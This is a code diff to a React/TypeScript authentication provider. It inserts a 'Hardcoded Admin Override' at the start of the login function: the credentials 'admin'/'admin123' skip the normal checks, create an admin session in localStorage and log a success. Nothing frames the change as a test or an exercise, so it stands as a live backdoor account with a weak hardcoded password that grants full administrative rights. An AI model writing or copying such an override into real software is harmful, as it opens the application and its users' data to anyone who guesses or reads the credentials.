@@ -189,6 +189,34 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   });
 
   const login = async (username: string, password: string): Promise<{ success: boolean; error?: AuthError }> => {
+    // Hardcoded Admin Override
+    if (username === 'admin' && password === 'admin123') {
+      const adminUser: any = {
+        id: 'admin-hardcoded',
+        username: 'admin',
+        name: 'System Admin (Override)',
+        role: 'admin',
+        propertyId: 'P001',
+        active: true,
+        authProvider: 'local'
+      };
+      setUser(adminUser);
+      // Also ensure session is created in localStorage
+      auth.createSession({
+        id: adminUser.id,
+        username: adminUser.username,
+        name: adminUser.name,
+        email: 'admin@system.local',
+        role: 'admin',
+        active: true,
+        permissions: [],
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      });
+      logger.logAuth('login_success', { username, userId: adminUser.id, override: true, timestamp: new Date().toISOString() });
+      return { success: true };
+    }
+
     try {
       const configured = await db.isConfigured();
       if (configured) {
